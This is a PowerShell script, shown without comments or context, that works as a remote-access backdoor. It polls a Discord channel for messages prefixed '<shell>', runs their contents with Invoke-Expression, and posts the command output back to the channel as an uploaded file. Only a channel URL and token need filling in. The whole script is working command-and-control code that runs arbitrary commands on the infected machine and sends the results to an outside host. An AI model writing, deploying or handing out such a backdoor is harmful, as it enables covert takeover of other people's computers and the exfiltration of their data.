$url = "<DISCORD_CHANNEL_URL>"
$discordToken = ""

$headers = @{
    Authorization = $discordToken
}

while ($true) {
    Start-Sleep -Seconds 5

    $response = Invoke-WebRequest -Uri ($url + "?limit=1") -Headers $headers

    if ($response.StatusCode -eq 200) {
        $messageData = $response.Content | ConvertFrom-Json

        if ($messageData[0].content -like "<shell>*") {
            $shellCommand = $messageData[0].content.Substring(7)
            
            Try {
                $result = Invoke-Expression $shellCommand 2>&1 | Out-String;

                $boundary = [System.Guid]::NewGuid().ToString()

                $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="shell.txt"
Content-Type: application/octet-stream

$result
--$boundary
Content-Disposition: form-data; name="content"

shell output:
--$boundary--
"@

                Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body -ContentType "multipart/form-data; boundary=$boundary"

            } catch {
                $body = @{
                    "content" = "error"
                }
        
                $bodyJson = $body | ConvertTo-Json
                Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $bodyJson -ContentType "application/json"
            }
        }
    }
}
